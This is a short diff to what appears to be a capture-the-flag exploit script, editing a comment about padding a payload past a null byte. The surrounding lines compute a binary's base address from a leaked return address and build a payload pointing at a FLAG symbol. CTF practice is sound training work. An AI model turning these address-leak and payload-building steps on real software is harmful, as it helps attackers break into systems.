@@ -20,7 +20,7 @@ print(hex(ret))
 elf.address = ret - elf.symbols.main
 print(hex(elf.address))
 
-padding = b'A' * 8 # to shift the addr down by 1 stack position, cant print flag in one as null there is null byte in the addr
+padding = b'A' * 8 # to shift the addr down by 1 stack position, cant print flag in one go as there is null byte in the addr, which acts as string terminator
 payload = padding + p64(elf.symbols.FLAG)
 
 print(hex(elf.symbols.FLAG))
